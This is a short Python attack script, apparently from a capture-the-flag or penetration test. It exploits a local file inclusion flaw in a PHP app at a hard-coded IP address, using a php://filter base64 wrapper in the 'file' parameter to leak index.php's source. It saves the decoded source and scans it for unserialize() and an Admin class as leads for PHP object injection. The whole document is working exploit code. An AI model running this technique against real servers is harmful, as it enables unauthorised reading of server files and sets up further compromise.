#!/usr/bin/env python3
"""
Read the source code to find the vulnerability
"""
import requests
import base64
import re

BASE_URL = "http://138.199.163.92:3000"

print("="*80)
print("READING SOURCE CODE")
print("="*80)

# Read index.php source
print(f"\n[Reading index.php source]")
r = requests.get(f"{BASE_URL}/index.php",
                params={"file": "php://filter/convert.base64-encode/resource=index.php"},
                timeout=10)

# Extract base64 from response
soup_text = r.text
b64_match = re.search(r'[A-Za-z0-9+/]{100,}={0,2}', soup_text)

if b64_match:
    decoded = base64.b64decode(b64_match.group(0)).decode('utf-8')
    print(f"\n[index.php source code]")
    print("="*80)
    print(decoded)
    print("="*80)
    
    with open('index_php_source.txt', 'w', encoding='utf-8') as f:
        f.write(decoded)
    
    # Look for clues
    if 'unserialize' in decoded:
        print(f"\n✓ Found unserialize() - possible PHP object injection!")
    
    if 'Admin' in decoded:
        print(f"\n✓ Found Admin class - check for deserialization exploit!")

print("\n" + "="*80)
